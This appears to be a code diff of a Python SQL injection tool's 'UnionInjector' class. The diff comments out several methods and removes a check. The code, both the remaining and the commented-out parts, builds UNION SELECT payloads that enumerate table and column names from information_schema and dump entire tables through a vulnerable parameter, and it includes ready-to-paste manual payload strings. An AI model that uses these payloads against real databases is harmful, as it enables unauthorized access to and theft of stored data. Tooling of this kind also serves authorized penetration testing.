@@ -108,20 +108,12 @@ class UnionInjector:
      	self, url: str, param: str, ctx: InjectionContext, expression: str, column_count: int
     ) -> str | None:
 		"""
-		Test UNION injection to check if we can retrieve the database name
-  		"""
-  
-		# Check if the marker we inject in the SQL query is printed back in the response body.
-		if not self.test_marker(url, param, ctx, column_count):
-			return None
-  
-		"""
 		Now that we know the injection works we will get the real table names
   		"""
   
 		# Add SELECT keyword if not included in the expression
 		expression = expression if expression.find("SELECT") != -1 else "SELECT " + expression
-		Logger.debug(f"expprrrrr: {expression}")
+		# Logger.debug(f"expression: {expression}")
 		payload = f"{ctx.prefix}UNION {expression}{ctx.suffix}"
 
 		response = self.requester.send(
@@ -133,68 +125,68 @@ class UnionInjector:
 		return self._extract_text(response.body)
 
 
-	def test_tables(self, url: str, param: str, ctx: InjectionContext, column_count) -> str | None:
-		"""
-		Test UNION injection to check if we can retrieve table names
-  		"""
+	# def test_tables(self, url: str, param: str, ctx: InjectionContext, column_count) -> str | None:
+	# 	"""
+	# 	Test UNION injection to check if we can retrieve table names
+  	# 	"""
 
-		# Check if the marker we inject in the SQL query is printed back in the response body.
-		if not self.test_marker(url, param, ctx, column_count):
-			return None
+	# 	# Check if the marker we inject in the SQL query is printed back in the response body.
+	# 	if not self.test_marker(url, param, ctx, column_count):
+	# 		return None
   
-		"""
-		Now that we know the injection works we will get the real table names
-  		"""
+	# 	"""
+	# 	Now that we know the injection works we will get the real table names
+  	# 	"""
   
-  		# Create a NULL list matching the number of columns to make query compatible.
-		# We substract 1 from count because the main element is added afterwards.
-		nulls = ",".join(["NULL"] * (column_count - 1))
+  	# 	# Create a NULL list matching the number of columns to make query compatible.
+	# 	# We substract 1 from count because the main element is added afterwards.
+	# 	nulls = ",".join(["NULL"] * (column_count - 1))
 	
-		payload = (
-			f"{ctx.prefix}UNION SELECT table_name,{nulls} FROM information_schema.tables{ctx.suffix}"
+	# 	payload = (
+	# 		f"{ctx.prefix}UNION SELECT table_name,{nulls} FROM information_schema.tables{ctx.suffix}"
 
-			# For testing manually:
-			#"1 UNION SELECT table_name,null FROM information_schema.tables"
-			#"1' UNION SELECT table_name,null FROM information_schema.tables -- -"
-		)
-		# Logger.debug(payload)
+	# 		# For testing manually:
+	# 		#"1 UNION SELECT table_name,null FROM information_schema.tables"
+	# 		#"1' UNION SELECT table_name,null FROM information_schema.tables -- -"
+	# 	)
+	# 	# Logger.debug(payload)
 
-		response = self.requester.send(
-			url,
-			{param: payload}
-		)
+	# 	response = self.requester.send(
+	# 		url,
+	# 		{param: payload}
+	# 	)
 
-		# Logger.debug(response.body)
-		return self._extract_text(response.body)
-
-
-	def test_columns(self, url: str, param: str, table: str) -> str:
-		payload = (
-			f"' UNION SELECT column_name "
-			f"FROM information_schema.columns "
-			f"WHERE table_name='{table}' -- "
-		)
-
-		response = self.requester.send(
-			url,
-			{param: payload}
-		)
-
-		return self._extract_text(response.body)
+	# 	# Logger.debug(response.body)
+	# 	return self._extract_text(response.body)
 
 
-	def dump_table(self, url: str, param: str, table: str, columns: str) -> str:
-		payload = (
-			f"' UNION SELECT {columns} "
-			f"FROM {table} -- "
-		)
+	# def test_columns(self, url: str, param: str, table: str) -> str:
+	# 	payload = (
+	# 		f"' UNION SELECT column_name "
+	# 		f"FROM information_schema.columns "
+	# 		f"WHERE table_name='{table}' -- "
+	# 	)
 
-		response = self.requester.send(
-			url,
-			{param: payload}
-		)
+	# 	response = self.requester.send(
+	# 		url,
+	# 		{param: payload}
+	# 	)
 
-		return self._extract_text(response.body)
+	# 	return self._extract_text(response.body)
+
+
+	# def dump_table(self, url: str, param: str, table: str, columns: str) -> str:
+	# 	payload = (
+	# 		f"' UNION SELECT {columns} "
+	# 		f"FROM {table} -- "
+	# 	)
+
+	# 	response = self.requester.send(
+	# 		url,
+	# 		{param: payload}
+	# 	)
+
+	# 	return self._extract_text(response.body)
 
 
 	def _extract_text(self, body: str) -> str:
